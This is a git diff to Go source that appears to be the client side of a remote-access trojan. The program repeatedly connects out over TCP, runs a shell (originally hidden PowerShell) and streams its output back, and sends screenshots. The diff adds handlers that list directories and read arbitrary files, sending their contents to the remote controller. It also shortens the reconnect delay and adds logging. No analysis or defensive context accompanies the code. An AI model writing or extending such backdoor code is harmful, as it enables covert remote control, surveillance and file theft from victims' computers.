@@ -6,6 +6,7 @@ import (
 	"image"
 	"image/png"
 	"io"
+	"io/fs"
 	"log"
 	"net"
 	"os"
@@ -51,8 +52,8 @@ func main() {
 	}
 
 	for {
-		log.Println("sleeping 10 seconds")
-		time.Sleep(10 * time.Second)
+		log.Println("sleeping 1 seconds")
+		time.Sleep(1 * time.Second)
 		log.Println("Connecting...")
 		conn, err := net.Dial("tcp", address)
 		if err != nil {
@@ -116,6 +117,8 @@ func readPipe(pipe io.ReadCloser, conn net.Conn) {
 			Output: strings.Trim(output, "\n"),
 		}
 
+		log.Println("sending message: ", message)
+
 		if err := sendMessage(conn, message, initkey); err != nil {
 			log.Println("error sending in readpipe: ", err.Error())
 		}
@@ -170,12 +173,61 @@ func handleMessage(conn net.Conn, message proto.Message, shell *Shell) {
 		if err != nil {
 			log.Println("error encoding: ", err.Error())
 		}
+
+		log.Println("sending image")
+
 		if err := sendMessage(conn, &Screenshot{
 			Data: image_bytes.Bytes(),
 			Time: strconv.FormatInt(time.Now().Unix(), 10),
 		}, initkey); err != nil {
 			log.Println("error sending image: ", err.Error())
 		}
+	case *GetDirectory:
+		files, err := os.ReadDir(m.Path)
+		infos := make([]*FileInfo, 0)
+		for _, file := range files {
+			infos = append(infos, toFileInfo(file))
+		}
+
+		if err != nil {
+			log.Println("error reading directory: ", err.Error())
+		}
+
+		if err := sendMessage(conn, &GetDirectoryResponse{
+			Files:    infos,
+			Basepath: m.Path,
+		}, initkey); err != nil {
+			log.Println("error sending directory: ", err.Error())
+		}
+
+	case *GetFile:
+		file, err := os.ReadFile(m.Path)
+		if err != nil {
+			log.Println("error reading file: ", err.Error())
+			return
+		}
+
+		if err := sendMessage(conn, &File{
+			Data: file,
+			Path: m.Path,
+		}, initkey); err != nil {
+			log.Println("error sending file: ", err.Error())
+		}
+	}
+}
+
+func toFileInfo(file fs.DirEntry) *FileInfo {
+	fileinfo, err := file.Info()
+	if err != nil {
+		log.Println("error getting file info: ", err.Error())
+		return &FileInfo{}
+	}
+
+	return &FileInfo{
+		Name:      file.Name(),
+		Size:      fileinfo.Size(),
+		Directory: file.IsDir(),
+		Owner:     "unimplemented",
 	}
 }
 
@@ -190,8 +242,9 @@ type Shell struct {
 
 func initShell(conn net.Conn) *Shell {
 	log.Println("loading shell")
-	command := exec.Command("powershell")
-	command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	command := exec.Command(os_shell)
+	//command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	command.SysProcAttr = &syscall.SysProcAttr{}
 	outpipe, err1 := command.StdoutPipe()
 	inpipe, err2 := command.StdinPipe()
 	errpipe, err3 := command.StderrPipe()
